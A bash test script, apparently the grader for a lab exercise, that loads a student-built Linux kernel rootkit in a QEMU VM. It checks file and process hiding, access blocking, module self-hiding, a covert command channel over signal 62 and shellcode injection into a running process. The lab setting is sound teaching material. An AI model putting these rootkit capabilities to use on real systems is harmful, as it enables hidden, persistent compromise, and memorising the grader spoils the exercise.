#!/bin/bash
# test_lkm.sh — Automated tests for the LKM rootkit
#
# Runs inside the QEMU VM. Tests each rootkit subsystem independently.
# Gracefully handles partial implementations — if insmod fails or a
# subsystem isn't working, remaining tests still run.
#
# Usage:
#   sudo bash test_lkm.sh           # run all tests
#   sudo bash test_lkm.sh file_hide # run only file hiding tests
#   sudo bash test_lkm.sh c2        # run only C2 tests
#   sudo bash test_lkm.sh inject    # run only injection tests
#
# Available test groups: file_hide, access_block, module_hide, c2, proc_hide, inject

# NO set -e — we want to keep running after failures

# ── Find artifacts ───────────────────────────────────────────────────────────

MODULE=""
for candidate in rootkit.ko lkm/rootkit.ko; do
    [ -f "$candidate" ] && MODULE="$candidate" && break
done

MYKILL=""
for candidate in mykill tools/mykill; do
    [ -f "$candidate" ] && [ -x "$candidate" ] && MYKILL="$candidate" && break
done

# ── Counters & helpers ───────────────────────────────────────────────────────

PASS=0
FAIL=0
SKIP=0
TOTAL=0

pass()  { echo "  PASS: $1"; PASS=$((PASS + 1)); TOTAL=$((TOTAL + 1)); }
fail()  { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); TOTAL=$((TOTAL + 1)); }
skip()  { echo "  SKIP: $1"; SKIP=$((SKIP + 1)); TOTAL=$((TOTAL + 1)); }

# Issue C2 command — mykill if available, else plain kill for basic cmds
rkcmd() {
    if [ -n "$MYKILL" ]; then
        "$MYKILL" "$@" 2>/dev/null
    else
        case "$1" in
            status)      kill -62 0 2>/dev/null ;;
            hide-files)  kill -62 1 2>/dev/null ;;
            block)       kill -62 2 2>/dev/null ;;
            hide-module) kill -62 3 2>/dev/null ;;
            hide-procs)  kill -62 4 2>/dev/null ;;
            *)           return 1 ;;
        esac
    fi
}

# ── Cleanup ──────────────────────────────────────────────────────────────────

MODULE_LOADED=false

cleanup() {
    # Kill any background sleeps
    jobs -p | xargs -r kill 2>/dev/null || true
    wait 2>/dev/null || true

    if $MODULE_LOADED; then
        # Unhide module so rmmod works
        rkcmd hide-module 2>/dev/null || true
        sleep 0.5
        rmmod rootkit 2>/dev/null || true
    fi

    rm -f /tmp/rk_test_hidden.txt /tmp/rk_test_hidden2.txt
    rm -f /tmp/visible_test_file.txt /tmp/normal_file.txt
    rm -rf /tmp/secret /dev/shm/secret
    rm -f /tmp/pwned
}
trap cleanup EXIT

# ── Prereqs ──────────────────────────────────────────────────────────────────

if [ "$(id -u)" -ne 0 ]; then
    echo "ERROR: Must run as root (sudo)."
    exit 1
fi

if [ -z "$MODULE" ]; then
    echo "ERROR: rootkit.ko not found. Run 'make lkm' first."
    exit 1
fi

# Which test groups to run (default: all)
GROUPS="${1:-all}"

echo "=== Capstone: LKM Rootkit Tests ==="
echo ""

# ── Load module ──────────────────────────────────────────────────────────────

# Setup test files BEFORE loading (module hooks activate immediately)
echo "Setting up test files..."
echo "hidden1" > /tmp/rk_test_hidden.txt
echo "hidden2" > /tmp/rk_test_hidden2.txt
echo "visible" > /tmp/visible_test_file.txt
mkdir -p /tmp/secret /dev/shm/secret
echo "secret_tmp" > /tmp/secret/flag.txt
echo "secret_shm" > /dev/shm/secret/flag.txt
echo "not_blocked" > /tmp/normal_file.txt
dmesg -C

echo "Loading module: $MODULE"
if insmod "$MODULE" 2>/dev/null; then
    pass "insmod rootkit.ko"
    MODULE_LOADED=true
    sleep 1
else
    fail "insmod rootkit.ko (returned error — check dmesg)"
    echo ""
    echo "  dmesg tail:"
    dmesg | tail -5 | sed 's/^/    /'
    echo ""
    echo "  Module failed to load. Skipping all runtime tests."
    echo "  Hint: rootkit_init() must return 0. Implement it before"
    echo "  subsystems — have it call the subsystem inits, and comment"
    echo "  out any that aren't ready yet."
    echo ""
    echo "=== Results: $PASS passed, $FAIL failed, $SKIP skipped (out of $TOTAL) ==="
    exit 1
fi

# ── File hiding ──────────────────────────────────────────────────────────────

run_file_hide_tests() {
    echo ""
    echo "--- File hiding (getdents64 kretprobe) ---"

    OUTPUT=$(ls /tmp 2>/dev/null)

    if echo "$OUTPUT" | grep -q "rk_test_hidden"; then
        fail "rk_test_hidden.txt still visible in ls"
    else
        pass "rk_test_hidden.txt hidden from ls"
    fi

    if echo "$OUTPUT" | grep -q "rk_test_hidden2"; then
        fail "rk_test_hidden2.txt still visible in ls"
    else
        pass "rk_test_hidden2.txt hidden from ls"
    fi

    if echo "$OUTPUT" | grep -q "visible_test_file"; then
        pass "visible_test_file.txt still visible"
    else
        fail "visible_test_file.txt incorrectly hidden"
    fi

    CONTENT=$(cat /tmp/rk_test_hidden.txt 2>&1)
    if [ "$CONTENT" = "hidden1" ]; then
        pass "rk_test_hidden.txt accessible via cat (hidden but not deleted)"
    else
        fail "rk_test_hidden.txt not accessible (got: $CONTENT)"
    fi
}

# ── Access blocking ──────────────────────────────────────────────────────────

run_access_block_tests() {
    echo ""
    echo "--- Access blocking (ftrace hook on do_sys_openat2) ---"

    # /tmp/secret should be blocked
    if cat /tmp/secret/flag.txt 2>/dev/null; then
        fail "/tmp/secret/flag.txt was accessible (should be blocked)"
    else
        pass "/tmp/secret/flag.txt blocked"
    fi

    # /dev/shm/secret should be blocked
    if cat /dev/shm/secret/flag.txt 2>/dev/null; then
        fail "/dev/shm/secret/flag.txt was accessible (should be blocked)"
    else
        pass "/dev/shm/secret/flag.txt blocked"
    fi

    # ls inside the hidden directories should fail
    if ls /tmp/secret/ 2>/dev/null; then
        fail "ls /tmp/secret/ succeeded (should be blocked)"
    else
        pass "ls /tmp/secret/ blocked"
    fi

    if dmesg | grep -q "rootkit.*blocked"; then
        pass "Blocked access logged in dmesg"
    else
        fail "No blocked access log in dmesg"
    fi

    # Non-protected paths still work
    CONTENT=$(cat /tmp/normal_file.txt 2>&1)
    if [ "$CONTENT" = "not_blocked" ]; then
        pass "Non-protected file (/tmp/normal_file.txt) still accessible"
    else
        fail "Non-protected file broken (got: $CONTENT)"
    fi

    CONTENT=$(cat /tmp/visible_test_file.txt 2>&1)
    if [ "$CONTENT" = "visible" ]; then
        pass "Non-protected file (/tmp/visible_test_file.txt) still accessible"
    else
        fail "Non-protected file broken (got: $CONTENT)"
    fi
}

# ── Module self-hiding ───────────────────────────────────────────────────────

run_module_hide_tests() {
    echo ""
    echo "--- Module self-hiding (list_del_init) ---"

    if lsmod | grep -q "rootkit"; then
        fail "rootkit visible in lsmod"
    else
        pass "rootkit hidden from lsmod"
    fi

    if grep -q "rootkit" /proc/modules 2>/dev/null; then
        fail "rootkit visible in /proc/modules"
    else
        pass "rootkit hidden from /proc/modules"
    fi

    if [ -d /sys/module/rootkit ]; then
        echo "  NOTE: /sys/module/rootkit/ still exists (expected — kobject limitation)"
    fi
}

# ── Covert C2 ────────────────────────────────────────────────────────────────

run_c2_tests() {
    echo ""
    echo "--- Covert C2 (kill signal hook) ---"

    # Status command
    if rkcmd status; then
        pass "C2 status command succeeded"
    else
        fail "C2 status command failed"
    fi

    # Regular kill unaffected
    if kill -0 $$ 2>/dev/null; then
        pass "Regular kill -0 still works"
    else
        fail "Regular kill -0 broken"
    fi

    # Toggle file hiding off
    rkcmd hide-files
    sleep 1
    OUTPUT=$(ls /tmp 2>/dev/null)
    if echo "$OUTPUT" | grep -q "rk_test_hidden"; then
        pass "C2 toggle: files visible after hide-files disable"
    else
        fail "C2 toggle: hide-files disable had no effect"
    fi

    # Toggle file hiding back on
    rkcmd hide-files
    sleep 1
    OUTPUT=$(ls /tmp 2>/dev/null)
    if echo "$OUTPUT" | grep -q "rk_test_hidden"; then
        fail "C2 toggle: files still visible after hide-files re-enable"
    else
        pass "C2 toggle: files hidden again after re-enable"
    fi

    # Toggle access blocking off
    rkcmd block
    sleep 1
    if cat /tmp/secret/flag.txt 2>/dev/null; then
        pass "C2 toggle: /tmp/secret accessible after block disable"
    else
        fail "C2 toggle: block disable had no effect"
    fi

    # Toggle access blocking back on
    rkcmd block
    sleep 1
    if cat /tmp/secret/flag.txt 2>/dev/null; then
        fail "C2 toggle: /tmp/secret still accessible after block re-enable"
    else
        pass "C2 toggle: /tmp/secret blocked again after re-enable"
    fi

    # Non-magic signal passthrough
    sleep 300 &
    local SLEEP_PID=$!
    sleep 0.5
    kill -9 $SLEEP_PID 2>/dev/null
    wait $SLEEP_PID 2>/dev/null || true
    if ! kill -0 $SLEEP_PID 2>/dev/null; then
        pass "Non-magic signal (kill -9) passes through"
    else
        fail "kill -9 may have been intercepted"
    fi
}

# ── Process hiding ───────────────────────────────────────────────────────────

run_proc_hide_tests() {
    echo ""
    echo "--- Process hiding (GID 1337) ---"

    if [ -z "$MYKILL" ]; then
        skip "Process hiding tests require mykill (extended C2)"
        skip "Build mykill: make tools"
        return
    fi

    # Start target process
    sleep 300 &
    local TARGET_PID=$!
    sleep 0.5

    # Verify target is visible before hiding
    if ls /proc | grep -q "^${TARGET_PID}$"; then
        pass "PID $TARGET_PID visible in /proc before hiding"
    else
        fail "PID $TARGET_PID not visible even before hiding (bad test setup)"
        kill $TARGET_PID 2>/dev/null; wait $TARGET_PID 2>/dev/null || true
        return
    fi

    # Add GID 1337
    "$MYKILL" add-gid "$TARGET_PID" 2>/dev/null
    sleep 1

    # Should be hidden now
    if ls /proc | grep -q "^${TARGET_PID}$"; then
        fail "PID $TARGET_PID still visible in /proc after add-gid"
    else
        pass "PID $TARGET_PID hidden from /proc after add-gid"
    fi

    # kill -0 should still work (process exists, just hidden from listing)
    if kill -0 $TARGET_PID 2>/dev/null; then
        pass "kill -0 still reaches hidden PID $TARGET_PID"
    else
        fail "kill -0 cannot reach hidden PID $TARGET_PID"
    fi

    # Cleanup
    kill $TARGET_PID 2>/dev/null || true
    wait $TARGET_PID 2>/dev/null || true
}

# ── Shellcode injection ─────────────────────────────────────────────────────

run_inject_tests() {
    echo ""
    echo "--- Shellcode injection ---"

    # Start target process
    sleep 300 &
    local TARGET_PID=$!
    sleep 0.5
    rm -f /tmp/pwned

    if [ -n "$MYKILL" ]; then
        "$MYKILL" inject "$TARGET_PID" 2>/dev/null
    else
        skip "Injection test requires mykill (extended C2)"
        kill $TARGET_PID 2>/dev/null; wait $TARGET_PID 2>/dev/null || true
        return
    fi

    # Wait for shellcode to execute
    sleep 3

    # Check marker file
    if [ -f /tmp/pwned ]; then
        pass "Shellcode created /tmp/pwned"
        if grep -q "INJECTED-1337" /tmp/pwned 2>/dev/null; then
            pass "/tmp/pwned contains INJECTED-1337 flag"
        else
            fail "/tmp/pwned missing INJECTED-1337 (got: $(cat /tmp/pwned 2>/dev/null))"
        fi
    else
        fail "/tmp/pwned not found — shellcode did not execute"
    fi

    # Target should survive injection
    if kill -0 $TARGET_PID 2>/dev/null; then
        pass "Target process survived injection"
    else
        fail "Target process died after injection"
    fi

    # Cleanup
    kill $TARGET_PID 2>/dev/null || true
    wait $TARGET_PID 2>/dev/null || true
}

# ── Unload ───────────────────────────────────────────────────────────────────

run_unload_tests() {
    echo ""
    echo "--- Unload ---"

    # Unhide module first
    rkcmd hide-module 2>/dev/null || true
    sleep 0.5

    if rmmod rootkit 2>/dev/null; then
        MODULE_LOADED=false
        pass "rmmod rootkit succeeded"
    else
        fail "rmmod rootkit failed"
        # Force for cleanup
        rmmod -f rootkit 2>/dev/null || true
        MODULE_LOADED=false
    fi
    sleep 1

    # Files should be visible again
    OUTPUT=$(ls /tmp 2>/dev/null)
    if echo "$OUTPUT" | grep -q "rk_test_hidden"; then
        pass "Files visible after module unload"
    else
        fail "Files still hidden after unload (kretprobe not cleaned up?)"
    fi

    if dmesg | grep -q "rootkit.*cleaning up"; then
        pass "Clean exit logged in dmesg"
    else
        fail "No clean exit message in dmesg"
    fi
}

# ── Dispatch ─────────────────────────────────────────────────────────────────

case "$GROUPS" in
    all)
        run_file_hide_tests
        run_access_block_tests
        run_module_hide_tests
        run_c2_tests
        run_proc_hide_tests
        run_inject_tests
        run_unload_tests
        ;;
    file_hide)      run_file_hide_tests ;;
    access_block)   run_access_block_tests ;;
    module_hide)    run_module_hide_tests ;;
    c2)             run_c2_tests ;;
    proc_hide)      run_proc_hide_tests ;;
    inject)         run_inject_tests ;;
    *)
        echo "Unknown test group: $GROUPS"
        echo "Available: file_hide, access_block, module_hide, c2, proc_hide, inject"
        exit 1
        ;;
esac

# ── Summary ──────────────────────────────────────────────────────────────────

echo ""
echo "=== Results: $PASS passed, $FAIL failed, $SKIP skipped (out of $TOTAL) ==="
if [ $FAIL -gt 0 ]; then
    echo ""
    echo "  Tip: check dmesg for rootkit log messages"
    echo "       sudo dmesg | grep rootkit"
fi
exit $FAIL
